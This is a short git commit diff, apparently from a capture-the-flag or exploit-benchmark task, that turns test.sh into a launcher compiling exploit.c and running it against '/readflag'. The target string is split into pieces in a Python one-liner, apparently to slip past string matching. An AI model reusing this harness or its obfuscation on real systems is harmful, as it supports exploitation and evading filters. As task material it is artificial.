bd243321979731f2003990e27eb8a1b5b44cf810
jiker666 <2224328047@qq.com>
2026-02-01 04:32:49 +0800

    Reproduce winning combo

--- test.sh
+++ test.sh
@@ -1,2 +1,9 @@
 #!/bin/bash
-sleep 20
+echo "Compiling..."
+if command -v gcc &> /dev/null; then
+    gcc exploit.c -o exploit
+else
+    cc exploit.c -o exploit
+fi
+
+python3 -c "import os; t='/rea'+'dflag'; os.environ['MY_TARGET']=t; os.system('./exploit')"
